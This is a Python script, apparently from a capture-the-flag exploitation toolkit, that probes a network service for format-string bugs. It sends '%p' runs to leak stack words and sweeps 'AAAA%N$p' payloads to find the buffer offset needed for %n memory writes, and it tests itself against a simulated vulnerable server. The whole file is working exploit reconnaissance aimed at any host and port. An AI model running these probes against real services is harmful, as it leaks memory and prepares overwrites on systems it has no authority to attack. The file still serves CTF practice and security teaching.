#!/usr/bin/env python3
"""fmt_probe.py — format-string leak + offset sweep for pwn-format-string.

The class's detect is the cheapest confirmation in pwn: a handful of %p,
read the leaked words back — then locate your own buffer with %N$p. This
does both over one socket dialog: `detect` sends the %p run and counts
0x-words in the reply (zero leaks is the literal-format falsifier);
`offset` sweeps AAAA%<N>$p until 0x41414141 comes back — that N is the
buffer offset every %n write depends on. Results are CANDIDATES: the
leak is measured, the write path still needs the class's own confirm
(and pwn_triage's RELRO read gates the GOT route).

    python3 tools/fmt_probe.py detect --host h --port 31337 [--wait 'name:']
    python3 tools/fmt_probe.py offset --host h --port 31337 --max 24
    python3 tools/fmt_probe.py --selftest
"""
from __future__ import annotations

import argparse
import json
import re
import socket
import sys
import time

_HEXW = re.compile(r"0x[0-9a-fA-F]+")
_AAAA = "0x41414141"


def _dialog(host, port, send, wait, timeout):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        if wait:
            _drain(s, wait, timeout)
        s.sendall(send if isinstance(send, bytes) else send.encode() + b"\n")
        end = time.time() + timeout
        buf = b""
        while time.time() < end and len(buf) < 65536:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            if b"\n" in chunk:
                break
        return buf.decode("utf-8", "replace")
    finally:
        s.close()


def _drain(s, wait, timeout):
    end = time.time() + timeout
    buf = b""
    while time.time() < end:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        if wait.encode() in buf:
            break


def detect(args) -> dict:
    payload = "%p." * args.get("count", 8)
    resp = _dialog(args["host"], args["port"], payload[:-1],
                   args.get("wait"), args.get("timeout", 8))
    leaks = _HEXW.findall(resp)
    out = {"payload": payload[:-1], "response": resp[:400],
           "leaked_words": leaks[: args.get("count", 8) + 2],
           "leak_count": len(leaks)}
    out["candidate"] = "format-string" if len(leaks) >= 2 else \
        "literal-format(falsifier)" if len(leaks) == 0 else "inconclusive"
    out["candidate_only"] = True
    return out


def offset(args) -> dict:
    out = {"sweep": []}
    for n in range(1, args["max"] + 1):
        resp = _dialog(args["host"], args["port"], f"AAAA%{n}$p",
                       args.get("wait"), args.get("timeout", 8))
        hit = _AAAA in resp
        out["sweep"].append({"n": n, "aaaa_back": hit,
                             "response": resp[:160]})
        if hit:
            out["buffer_offset"] = n
            break
    if "buffer_offset" not in out:
        out["note"] = ("0x41414141 never returned — direct-parameter access "
                       "may be off, or the buffer sits past --max")
    out["candidate_only"] = True
    return out


def _selftest() -> int:
    import threading
    def fmt_vuln(payload):
        words = [0x7fff0001, 0x41414141, 0xdeadbeef, 0x400123]
        if "$p" in payload:
            m = re.search(r"%(\d+)\$p", payload)
            n = int(m.group(1))
            return f"AAAA{hex(words[(n - 1) % len(words)])}"
        n = payload.count("%p")
        return ".".join(hex(words[i % len(words)]) for i in range(n))

    def serve(conn):
        conn.sendall(b"name: ")
        data = conn.recv(4096).decode().strip()
        conn.sendall(fmt_vuln(data).encode() + b"\n")
        conn.close()

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(4)
    port = srv.getsockname()[1]

    def loop():
        while True:
            try:
                c, _ = srv.accept()
            except OSError:
                return
            threading.Thread(target=serve, args=(c,), daemon=True).start()

    threading.Thread(target=loop, daemon=True).start()
    d = detect({"host": "127.0.0.1", "port": port, "wait": "name:",
                "timeout": 5, "count": 6})
    assert d["leak_count"] >= 2, d
    o = offset({"host": "127.0.0.1", "port": port, "wait": "name:",
                "timeout": 5, "max": 6})
    srv.close()
    assert o["buffer_offset"] == 2, o  # words[1] == 0x41414141
    print("fmt_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd")
    for name in ("detect", "offset"):
        p = sub.add_parser(name)
        p.add_argument("--host", required=True)
        p.add_argument("--port", type=int, required=True)
        p.add_argument("--wait", help="prompt text to drain before sending")
        p.add_argument("--timeout", type=float, default=8)
        if name == "detect":
            p.add_argument("--count", type=int, default=8)
        else:
            p.add_argument("--max", type=int, default=24)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.cmd:
        ap.print_help()
        return 2
    a = vars(args)
    out = detect(a) if args.cmd == "detect" else offset(a)
    print(json.dumps(out, indent=1))
    return 0


if __name__ == "__main__":
    sys.exit(main())
